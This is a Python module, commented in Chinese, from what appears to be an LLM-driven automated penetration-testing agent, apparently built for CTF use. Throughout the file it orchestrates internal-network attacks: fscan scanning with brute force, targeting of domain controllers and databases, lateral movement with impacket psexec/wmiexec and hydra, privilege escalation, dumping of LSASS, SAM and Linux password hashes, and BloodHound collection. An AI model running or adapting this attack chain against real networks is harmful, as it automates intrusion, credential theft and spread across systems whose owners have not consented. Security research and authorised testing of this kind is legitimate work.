# internal_network/nodes.py
"""
内网渗透节点实现

节点:
- internal_recon_node: 内网侦察节点
- lateral_move_node: 横向移动节点
- privilege_escalation_node: 权限提升节点 (新增)

设计原则:
- 独立于Web CTF架构
- 复用现有工具系统
- 不修改核心状态结构
"""
import json
import time
from typing import Dict, List, Any, Optional
from llm_client import llm_client
from config import config
from tool_framework import ToolRegistry

# 导入高级操作模块
try:
    from internal_network.advanced_operations import (
        PrivilegeEscalation,
        RemoteDesktopHandler,
        FileTransferHandler,
        CredentialDumper,
        IntelligentPathSelector,
        OperationStatus
    )
    ADVANCED_OPS_AVAILABLE = True
except ImportError:
    print("[Warning] Advanced operations module not available")
    ADVANCED_OPS_AVAILABLE = False


def internal_recon_node(state: Dict) -> Dict:
    """
    [内网侦察节点] 扫描内网主机和服务

    输入:
        - internal_network_range: 内网网段
        - pivot_host: 跳板机

    输出:
        - internal_hosts: 发现的主机列表
        - update CTFState

    工作流程:
        1. 使用fscan扫描目标（快速、全面、自动漏洞识别）
        2. 解析结果
        3. 更新状态
    """
    network_range = state.get("internal_network_range", "")
    pivot_host = state.get("pivot_host", "")
    current_url = state.get("current_url", "")

    # 从当前URL提取目标IP
    target_ip = ""
    if not network_range:
        import re
        if current_url:
            ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', current_url)
            if ip_match:
                target_ip = ip_match.group(1)
                # 默认扫描单个IP
                network_range = target_ip

    if not network_range:
        return {
            "error": "无法确定扫描目标",
            "internal_mode": False,
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 1.0
        }

    print(f"[InternalRecon] 使用 fscan 扫描目标: {network_range}")

    # 使用 fscan 扫描
    try:
        fscan_result = ToolRegistry.execute_cached(
            "fscan",
            network_range,
            {
                "scan_type": "quick",
                "brute": True,
                "no_ping": True
            }
        )

        # 检查结果有效性
        if fscan_result and fscan_result.get("result", {}).get("success"):
            result = fscan_result.get("result", {})
            hosts_data = result.get("hosts", [])
            vulnerabilities = result.get("vulnerabilities", [])

            if hosts_data:
                # 解析主机
                hosts = []
                for host_data in hosts_data:
                    if not isinstance(host_data, dict):
                        continue

                    host_info = {
                        "ip": host_data.get("ip", ""),
                        "hostname": "",
                        "os": "",
                        "ports": []
                    }

                    for port in host_data.get("ports", []):
                        if port.get("state") == "open" or port.get("port"):
                            host_info["ports"].append({
                                "port": port.get("port"),
                                "protocol": "tcp",
                                "service": port.get("service", ""),
                                "version": ""
                            })

                    if host_info["ports"] and host_info["ip"]:
                        hosts.append(host_info)

                if hosts:
                    print(f"[InternalRecon] fscan 发现 {len(hosts)} 台主机")

                    # AI分析发现
                    analysis = _analyze_internal_hosts(hosts)

                    # 选择高价值目标
                    first_target = _select_high_value_target(hosts)

                    return {
                        "internal_hosts": hosts,
                        "internal_mode": True,
                        "current_internal_target": first_target,
                        "analyst_intel": analysis,
                        "execution_steps": state.get("execution_steps", 0) + 1
                    }

        # 无结果
        return {
            "error": "fscan 未发现存活主机或端口",
            "internal_mode": False,
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 0.5
        }

    except Exception as e:
        print(f"[InternalRecon] fscan 异常: {e}")
        return {
            "error": f"扫描异常: {str(e)}",
            "internal_mode": False,
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 1.0
        }


def _select_high_value_target(hosts: List[Dict]) -> str:
    """
    选择高价值目标

    优先级:
    1. 域控制器 (88, 389, 636, 3268端口)
    2. 数据库服务器 (1433, 3306, 5432端口)
    3. 文件服务器 (445端口)
    4. 第一个可用主机
    """
    for host in hosts:
        ports = [p.get("port") for p in host.get("ports", []) if p.get("port")]
        # 域控制器
        if any(p in ports for p in [88, 389, 636, 3268]):
            return host.get("ip", "")
        # 数据库
        if any(p in ports for p in [1433, 3306, 5432]):
            return host.get("ip", "")
        # 文件服务器
        if 445 in ports:
            return host.get("ip", "")

    # 返回第一个
    return hosts[0].get("ip", "") if hosts else ""


def lateral_move_node(state: Dict) -> Dict:
    """
    [横向移动节点] 尝试横向移动到其他主机

    输入:
        - current_internal_target: 当前目标
        - credentials: 已获取的凭据
        - internal_hosts: 已发现的主机

    输出:
        - active_sessions: 新会话
        - lateral_movement_paths: 移动路径

    工作流程:
        1. 选择目标主机
        2. 选择合适的移动方法
        3. 执行横向移动
        4. 记录结果
    """
    # 安全获取列表，处理None值
    target = state.get("current_internal_target", "")
    credentials = state.get("credentials") or []
    internal_hosts = state.get("internal_hosts") or []
    active_sessions = state.get("active_sessions") or []

    if not target:
        # 选择下一个目标
        for host in internal_hosts:
            if not isinstance(host, dict):
                continue
            host_ip = host.get("ip")
            if host_ip and host_ip != state.get("pivot_host"):
                # 检查是否已经攻陷
                if host_ip not in [s.get("host") for s in active_sessions if s.get("host")]:
                    target = host_ip
                    break

    if not target:
        return {
            "error": "没有可用的横向移动目标",
            "internal_mode": False,
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 0.5
        }

    if not credentials:
        return {
            "error": "没有可用凭据",
            "current_internal_target": target,
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 1.0
        }

    # [优化] 智能选择最适合目标主机的凭据
    cred = _select_best_credential(credentials, target, internal_hosts)

    print(f"[LateralMove] 尝试移动到 {target} 使用 {cred.get('username', 'unknown')}")

    # 根据目标端口选择方法
    target_host = next(
        (h for h in internal_hosts if isinstance(h, dict) and h.get("ip") == target),
        {}
    )
    ports = target_host.get("ports") or []

    method = _select_lateral_method(ports)

    # 执行横向移动
    result = None
    try:
        if method == "psexec" or method == "wmiexec":
            result = ToolRegistry.execute_cached(
                "impacket",
                target,
                {
                    "script": method,
                    "target": target,
                    "username": cred.get("username", ""),
                    "password": cred.get("password", ""),
                    "domain": cred.get("domain", ""),
                    "hash": cred.get("hash", ""),
                    "command": "whoami"
                }
            )
        elif method == "ssh":
            result = ToolRegistry.execute_cached(
                "hydra",
                target,
                {
                    "target": target,
                    "protocol": "ssh",
                    "username": cred.get("username", ""),
                    "password": cred.get("password", "")
                }
            )
        else:
            result = {"error": f"未知的横向移动方法: {method}"}

        # 处理结果
        if result and result.get("result", {}).get("success"):
            session = {
                "host": target,
                "session_type": method,
                "username": cred.get("username", ""),
                "shell_type": "shell"
            }

            move_path = {
                "source": state.get("pivot_host", ""),
                "target": target,
                "method": method,
                "credential_used": f"{cred.get('username')}@{cred.get('domain', 'WORKGROUP')}"
            }

            print(f"[LateralMove] 成功获取 {target} 的shell")

            return {
                "active_sessions": [session],
                "lateral_movement_paths": [move_path],
                "pivot_host": target,  # 更新跳板机
                "execution_steps": state.get("execution_steps", 0) + 1
            }

        # 提取更详细的错误信息
        error_msg = "横向移动失败"
        if result:
            if result.get("error"):
                error_msg = result["error"]
            elif result.get("result", {}).get("error"):
                error_msg = result["result"]["error"]

        print(f"[LateralMove] 失败: {error_msg}")

        return {
            "error": error_msg,
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 1.0,
            "current_internal_target": target
        }

    except Exception as e:
        print(f"[LateralMove] 异常: {e}")
        return {
            "error": f"横向移动异常: {str(e)}",
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 1.0
        }


def _select_best_credential(
    credentials: List[Dict],
    target: str,
    internal_hosts: List[Dict]
) -> Dict:
    """
    智能选择最适合目标主机的凭据

    优先级:
    1. 与目标同域的凭据
    2. 管理员凭据
    3. 第一个可用凭据
    """
    # 获取目标主机的域信息
    target_host = next(
        (h for h in internal_hosts if isinstance(h, dict) and h.get("ip") == target),
        {}
    )
    target_domain = target_host.get("domain", "")

    # 优先选择同域凭据
    if target_domain:
        for cred in credentials:
            if isinstance(cred, dict) and cred.get("domain") == target_domain:
                return cred

    # 其次选择管理员凭据
    for cred in credentials:
        if isinstance(cred, dict):
            username = cred.get("username", "").lower()
            if username in ["administrator", "admin", "root"]:
                return cred

    # 返回第一个可用凭据
    return credentials[0] if credentials else {}


def _analyze_internal_hosts(hosts: List[Dict]) -> str:
    """AI分析内网主机发现"""
    if not hosts:
        return "未发现内网主机"

    # 构建摘要
    summary_lines = []
    for host in hosts[:10]:
        ports = host.get("ports") or []
        ports_str = ", ".join([f"{p['port']}/{p.get('service', '?')}" for p in ports[:5] if isinstance(p, dict) and 'port' in p])
        summary_lines.append(f"{host.get('ip', 'unknown')}: [{ports_str}]")

    summary = "\n".join(summary_lines)

    prompt = f"""
分析内网扫描结果，识别高价值目标和潜在攻击路径。

## 发现的主机
{summary}

## 分析要求
1. 识别可能存在漏洞的服务
2. 推荐优先攻击的目标
3. 建议攻击方法

## 输出格式 (JSON)
{{
  "high_value_targets": ["IP列表"],
  "vulnerable_services": ["服务列表"],
  "recommended_approach": "一句话建议",
  "priority_order": ["IP顺序"]
}}
"""

    try:
        analysis = llm_client.call_chat_completion(
            model=config.ANALYST_MODEL,
            messages=[{"role": "user", "content": prompt}],
            temperature=0.1,
            json_mode=True
        )

        if "```json" in analysis:
            analysis = analysis.split("```json")[1].split("```")[0]

        result = json.loads(analysis.strip())
        return f"高价值目标: {', '.join(result.get('high_value_targets', []))}\n建议: {result.get('recommended_approach', '')}"

    except Exception:
        return f"发现 {len(hosts)} 台主机，建议优先测试开放445/3389端口的主机"


def _select_lateral_method(ports: List[Dict]) -> str:
    """根据端口选择横向移动方法"""
    port_numbers = [p.get("port") for p in ports]

    if 445 in port_numbers:  # SMB
        return "psexec"
    elif 135 in port_numbers or 5985 in port_numbers or 5986 in port_numbers:  # WinRM/WMI
        return "wmiexec"
    elif 22 in port_numbers:  # SSH
        return "ssh"
    elif 3389 in port_numbers:  # RDP
        return "rdp"
    else:
        return "psexec"  # 默认尝试psexec


def privilege_escalation_node(state: Dict) -> Dict:
    """
    [权限提升节点] 尝试在当前会话中提权

    输入:
        - active_sessions: 活跃会话
        - current_internal_target: 当前目标

    输出:
        - active_sessions: 更新后的会话（包含提权状态）
        - credentials: 新获取的凭据

    工作流程:
        1. 检查当前权限
        2. 选择合适的提权方法
        3. 执行提权
        4. 尝试凭据转储
    """
    if not ADVANCED_OPS_AVAILABLE:
        return {
            "error": "高级操作模块不可用",
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 0.5
        }

    # 安全获取列表
    active_sessions = state.get("active_sessions") or []
    credentials = state.get("credentials") or []

    if not active_sessions:
        return {
            "error": "没有活跃会话可用于提权",
            "internal_mode": False,
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 1.0
        }

    # 选择第一个会话进行提权
    session = active_sessions[0]
    target = session.get("host", "")

    print(f"[PrivEsc] 检查 {target} 的权限状态...")

    try:
        # 检查当前权限
        priv_check = PrivilegeEscalation.check_privileges(session)

        if priv_check.get("is_system"):
            print(f"[PrivEsc] 已是 SYSTEM/ROOT 权限")
            return {
                "active_sessions": active_sessions,
                "execution_steps": state.get("execution_steps", 0) + 1
            }

        if priv_check.get("is_admin"):
            print(f"[PrivEsc] 已是管理员权限，尝试转储凭据")
            # 尝试凭据转储
            return _attempt_credential_dump(state, session, active_sessions, credentials)

        # 获取可用的提权方法
        available_methods = priv_check.get("available_methods", [])
        if not available_methods:
            print(f"[PrivEsc] 未发现可用的提权方法")
            return {
                "error": "未发现可用的提权方法",
                "failure_weighted_score": state.get("failure_weighted_score", 0) + 0.5,
                "active_sessions": active_sessions
            }

        # 尝试最高置信度的方法
        best_method = max(available_methods, key=lambda m: m.get("confidence", 0))
        method_name = best_method.get("name")

        print(f"[PrivEsc] 尝试使用 {method_name} 提权...")

        result = PrivilegeEscalation.attempt_escalation(session, method_name)

        if result.status == OperationStatus.SUCCESS:
            print(f"[PrivEsc] 提权成功！")
            # 更新会话状态
            session["is_admin"] = True

            # 尝试凭据转储
            return _attempt_credential_dump(state, session, active_sessions, credentials)

        else:
            print(f"[PrivEsc] 提权失败: {result.message}")
            return {
                "error": result.message,
                "failure_weighted_score": state.get("failure_weighted_score", 0) + 0.5,
                "active_sessions": active_sessions
            }

    except Exception as e:
        print(f"[PrivEsc] 异常: {e}")
        return {
            "error": f"提权异常: {str(e)}",
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 0.5
        }


def _attempt_credential_dump(state: Dict, session: Dict,
                              active_sessions: List, credentials: List) -> Dict:
    """尝试凭据转储"""
    new_credentials = list(credentials)

    try:
        if session.get("os", "").lower() == "windows":
            # 尝试LSASS转储
            result = CredentialDumper.dump_lsass(session)
            if result.status == OperationStatus.SUCCESS:
                print(f"[CredDump] LSASS转储成功")
                # 解析获取的凭据（这里简化处理）
                # 实际应该解析result.data中的凭据

            # 尝试SAM转储
            result = CredentialDumper.dump_sam_system(session)
            if result.status in [OperationStatus.SUCCESS, OperationStatus.PARTIAL]:
                print(f"[CredDump] SAM/SYSTEM转储成功")
        else:
            # Linux 凭据转储
            result = CredentialDumper.dump_linux_hashes(session)
            if result.status == OperationStatus.SUCCESS:
                print(f"[CredDump] 获取到Linux密码哈希")
                hashes = result.data.get("hashes", [])
                for h in hashes:
                    new_credentials.append({
                        "host": session.get("host"),
                        "username": h.get("username"),
                        "hash": h.get("hash"),
                        "cred_type": "password_hash"
                    })

    except Exception as e:
        print(f"[CredDump] 凭据转储失败: {e}")

    return {
        "active_sessions": active_sessions,
        "credentials": new_credentials if len(new_credentials) > len(credentials) else credentials,
        "execution_steps": state.get("execution_steps", 0) + 1
    }


def credential_gather_node(state: Dict) -> Dict:
    """
    [凭据收集节点] 从目标主机收集凭据

    输入:
        - current_internal_target: 当前目标
        - internal_hosts: 已发现的主机

    输出:
        - credentials: 收集到的凭据

    工作流程:
        1. 检查目标服务
        2. 尝试常见攻击（如SMB匿名登录）
        3. 记录发现
    """
    target = state.get("current_internal_target", "")
    internal_hosts = state.get("internal_hosts") or []

    if not target:
        return {"error": "没有指定目标"}

    # 获取目标信息
    target_host = next(
        (h for h in internal_hosts if isinstance(h, dict) and h.get("ip") == target),
        None
    )

    if not target_host:
        return {
            "error": f"未找到目标 {target} 的信息",
            "failure_weighted_score": state.get("failure_weighted_score", 0) + 0.5
        }

    ports = target_host.get("ports") or []
    port_numbers = [p.get("port") for p in ports if isinstance(p, dict)]

    credentials = state.get("credentials") or []

    print(f"[CredGather] 尝试从 {target} 收集凭据...")

    # 尝试SMB匿名登录
    if 445 in port_numbers:
        result = ToolRegistry.execute_cached(
            "crackmapexec",
            target,
            {
                "target": target,
                "protocol": "smb",
                "action": "shares"
            }
        )

        if result.get("result", {}).get("success"):
            # 检查是否有匿名共享
            shares = result.get("result", {}).get("shares", [])
            if shares:
                print(f"[CredGather] 发现 {len(shares)} 个SMB共享")

    # 尝试LDAP匿名绑定或使用已获取凭据
    if 389 in port_numbers or 636 in port_numbers:
        # 检查是否有可用的域凭据
        domain = state.get("ad_domain", "")
        domain_creds = [c for c in credentials if c.get("domain") == domain] if domain else []

        if domain_creds or domain:
            # 使用第一个可用凭据
            cred = domain_creds[0] if domain_creds else {}
            username = cred.get("username", "")
            password = cred.get("password", "")
            hash_val = cred.get("hash", "")

            if username and (password or hash_val):
                print(f"[CredGather] 尝试BloodHound数据采集...")

                result = ToolRegistry.execute_cached(
                    "bloodhound",
                    target,
                    {
                        "domain": domain,
                        "dc": target,
                        "username": username,
                        "password": password,
                        "hash": hash_val,
                        "collection": "all"
                    }
                )

                # 处理BloodHound结果
                if result.get("result", {}).get("success"):
                    bh_data = result.get("result", {})
                    # 发现的攻击路径
                    attack_paths = bh_data.get("attack_paths", [])
                    high_value_targets = bh_data.get("high_value_targets", [])

                    if attack_paths:
                        print(f"[CredGather] BloodHound发现 {len(attack_paths)} 条攻击路径")

                    # 更新analyst_intel
                    intel = f"[BloodHound] {bh_data.get('summary', '采集完成')}"
                    if high_value_targets:
                        intel += f"\n高价值目标: {', '.join(high_value_targets[:5])}"

                    return {
                        "credentials": credentials,
                        "current_internal_target": target,
                        "analyst_intel": intel,
                        "attack_paths": attack_paths,
                        "high_value_targets": high_value_targets,
                        "execution_steps": state.get("execution_steps", 0) + 1
                    }
                elif result.get("error"):
                    print(f"[CredGather] BloodHound失败: {result.get('error')}")
            else:
                print(f"[CredGather] 缺少有效的域凭据，跳过BloodHound")

    return {
        "credentials": credentials,
        "current_internal_target": target,
        "execution_steps": state.get("execution_steps", 0) + 1
    }